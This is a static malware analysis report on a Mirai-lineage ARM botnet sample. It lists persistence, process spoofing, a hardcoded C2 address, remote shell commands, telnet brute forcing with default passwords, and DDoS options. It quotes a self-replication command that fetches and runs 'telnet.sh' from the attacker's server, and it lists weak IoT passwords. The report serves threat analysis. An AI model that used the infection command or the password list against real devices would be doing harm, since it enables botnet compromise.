## Behavior Analysis

**9** behaviors in total, each backed by evidence, and all are static.

### 1. init.d Boot Persistence

`T1037.004` · Confidence **High** · Static

The program writes a startup script to /etc/init.d/xs.main (content begins with '#!/bin/sh' and concatenates its own path and arguments) and appends the same startup command to /etc/rc.local for boot autostart.

> **Evidence**: FUN_0000840c @ 0x840c references off 0x20f68 '/etc/init.d/xs.main' and off 0x20f94 '/etc/rc.local', opening them for write/append and formatting the output
> 
> **Source**: `ev-000005` · `ev-000002`

### 2. Spoof Process Name as -sh

`T1036.005` · Confidence **High** · Static

After persistence, the program overwrites argv[0] with '-sh', making the process appear as an ordinary shell in the system process list and reducing the chance of manual discovery.

> **Evidence**: FUN_0000840c @ 0x840c: thunk_FUN_00023c40(*param_2, DAT_000085ec, 3), DAT_000085ec points to '-sh' at off 0x20f58, then FUN_00016800 writes it back to the process arguments
> 
> **Source**: `ev-000005` · `ev-000002`

### 3. Connect Hardcoded C2

`T1095` · Confidence **High** · Static

The main loop passes the hardcoded host '206.189.84[.]190' to the address-resolution function, builds sockaddr_in (port constant 0x7c1f, network order 8060), establishes a connection with AF_INET/SOCK_STREAM, and sends handshake data containing 'armv7l' and the default identifier 'default'.

> **Evidence**: FUN_0000b8e8 @ 0xb8e8 references off 0x21524 '206.189.84[.]190'; 0xb998 mov lr,#0x7c00, 0xb99c add lr,#0x1f, 0xb9ac strh writes the sockaddr_in port field; 0xbab4 socket(2,1,0)
> 
> **Source**: `ev-000004` · `ev-000002`

### 4. Parse Remote Commands

`T1059.004` · Confidence **High** · Static

After the connection is established it loops reading controller data and matches commands by prefix: ping, !selfrep telnet, !selfrep realtek, !openshell, !shellcmd, !update, !kill and others; it replies 'pong %s' to ping and executes shellcmd as '%s 2>&1'.

> **Evidence**: Command table of FUN_0000b8e8 @ 0xb8e8 at off 0xc8f8–0xc930; corresponding strings off 0x21544 'ping', 0x21554 '!selfrep telnet', 0x2157c '!openshell', 0x21588 '!shellcmd ', 0x2159c '!update', 0x21620 '!kill'
> 
> **Source**: `ev-000004` · `ev-000002`

### 5. Telnet Weak-Password Brute Force

`T1110.001` · Confidence **High** · Static

Scans random IPv4 addresses on 23/TCP, reads the Login/Password prompts and tries a built-in password list (root, xc3511, admin, 888888, 7ujMko0admin, dreambox etc.); on success it sends the target a command to download and execute telnet.sh.

> **Evidence**: FUN_0000e060 @ 0xe060: sockaddr_in port constant local_52=0x1700 (network order 23), random IP format off 0x2166c '%u.%d.%d.%d', password table from off 0x21884, trailing telnet.sh delivery string at off 0x21804
> 
> **Source**: `ev-000010` · `ev-000002`

### 6. Deliver Script for Self-Replication

`T1105` · Confidence **High** · Static

A dedicated propagation thread sends a script containing 'cd /tmp ... wget hxxp://206.189.84[.]190:87/telnet.sh ... sh telnet.sh' to random targets on port 9034/TCP, carrying mipsel/mips download commands for lateral infection.

> **Evidence**: FUN_0000ce5c @ 0xce5c: random IP, port constant local_36=0x4a23 (network order 0x234a/9034), sends the telnet.sh script at off 0x21804 and the mipsel/mips payload at off 0x21678
> 
> **Source**: `ev-000009` · `ev-000002`

### 7. Download Update and Execute

`T1105` · Confidence **High** · Static

On receiving !update it parses the hardcoded '206.189.84[.]190:87', sends 'GET /%s HTTP/1.0' (User-Agent 'armv7l') to that HTTP service, writes the response to /tmp, /var or /dev/shm, then changes permissions and fork/execs the new payload.

> **Evidence**: FUN_0000f5e0 @ 0xf5e0 references off 0x21720 '206.189.84[.]190:87', off 0x21988 'GET /%s HTTP/1.0', off 0x219bc '/tmp', off 0x219c4 '/var', off 0x219cc '/dev/shm'
> 
> **Source**: `ev-000007` · `ev-000002`

### 8. Disable Watchdog

`T1562.001` · Confidence **High** · Static

Periodically checks and opens /dev/watchdog, /dev/misc/watchdog, /dev/watchdog0/1 and the watchdogd path; after a successful open it writes data and performs related operations to prevent the watchdog from rebooting the infected device.

> **Evidence**: FUN_0000b514 @ 0xb514 references off 0x21480 '/dev/watchdog', 0x21490 '/dev/misc/watchdog', 0x214a4 '/usr/bin/watchdogd', 0x214e0 '/dev/watchdog0' etc., and calls open/write wrappers
> 
> **Source**: `ev-000006` · `ev-000002`

### 9. Parse DDoS Parameters

`T1498` · Confidence **Medium** · Static

The command parser recognizes key-value pairs such as psize=, srcport=, httpmode=, gport=, gre_proto=, usleep=, port= and udpplain for launching UDP/GRE/HTTP volumetric denial-of-service attacks.

> **Evidence**: Parameter table of FUN_0000b8e8 @ 0xb8e8 from off 0xc938; strings off 0x215b0 'psize=', 0x215b8 'srcport=', 0x215c4 'httpmode=', 0x215d0 'gport=', 0x215d8 'gre_proto=', 0x21608 'udpplain'

## Common Misinterpretations

:::important
The following conclusions are **easy to misinterpret**; keep them in mind when citing this report.

- Do not conclude from the string 'Not a mirai at all' alone that the sample is unrelated to Mirai; that string is the sample's own taunt, and the code structure (telnet password table, watchdog clearing, ping/pong commands, DDoS parameters) matches the Mirai lineage.
- Do not claim that a real C2 session, successful download or successful outbound connection was observed in this run; the dynamic channel produced no observable events, and all C2/download addresses come from static extraction and still need dynamic re-verification.
- Do not treat 206.189.84[.]190:87 as the main control port; 87 is used for telnet.sh/update payload downloads, while the main control connection is TCP 8060 (statically derived from the sockaddr_in port constant).
- Do not classify it as ransomware or a credential stealer; no file encryption, wallet operations or credential-return code was found.
:::

**Limitations and pending verification**

1. The dynamic sandbox returned no observable events for the 32-bit ARM ELF (no stdout, behavior or network records), so the sample could not be truly detonated; reproduced=false, and all behavior conclusions come from static decompilation and string/structure analysis.
2. The main C2 port 8060 is statically derived from the sockaddr_in port constant 0x7c1f (network order 8060); no actual connection was observed and it is marked pending_dynamic_verify.
3. The download address 206.189.84[.]190:87 and the /telnet.sh, /mipsel, /mips paths come from sample strings and formatting logic, and no HTTP request or response was observed.
4. The sample is stripped and some functions were identified heuristically; the entry and persistence functions have control-flow recovery warnings, but key string references and syscall sequences corroborate each other.
5. No vendor engine, YARA or public sandbox naming data was obtained, so the family can only be assigned to the Mirai lineage and the specific derivative branch name cannot be determined.
